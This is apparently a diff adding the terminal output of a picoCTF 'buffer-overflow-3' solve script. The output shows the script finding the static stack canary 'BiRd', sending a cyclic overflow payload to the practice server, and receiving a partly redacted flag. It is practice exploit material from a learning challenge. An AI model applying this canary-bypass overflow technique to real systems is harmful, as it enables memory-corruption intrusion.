@@ -1,0 +1,9 @@
+[31m$[0m python3 buffer-overflow-3.py
+[36m[+[0m] Finding canary: 'BiRd'
+[36m[+[0m] Opening connection to saturn.picoctf.net on port 57427: Done
+[36m[+[0m] Receiving all data: Done (162B)
+[34m[*[0m] Closed connection to saturn.picoctf.net port 57427
+[36m[+[0m] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaBiRdraaasaaataa-
+auaaa6^H
+    Ok... Now Where's the Flag?
+    picoCTF{Stat1C_c4n4r13s_4R3_b4D_[90m[REDACTED][0m}
